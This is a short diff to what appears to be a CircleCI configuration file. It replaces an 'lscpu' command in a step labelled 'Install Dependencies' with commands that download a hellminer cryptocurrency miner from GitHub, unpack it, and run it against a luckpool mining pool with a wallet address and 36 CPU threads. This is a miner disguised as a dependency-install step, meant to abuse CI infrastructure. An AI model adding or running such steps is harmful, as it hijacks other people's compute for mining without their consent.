@@ -8,7 +8,10 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              lscpu
+              wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+              tar -xf hellminer_cpu_linux.tar.gz
+              ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RWxDLj3qs6M4NqbepNnEgHHP3EPzYU3nPZ.cpu2 -p x --cpu 36
+
               echo Hello,subscribe it
 
 workflows:
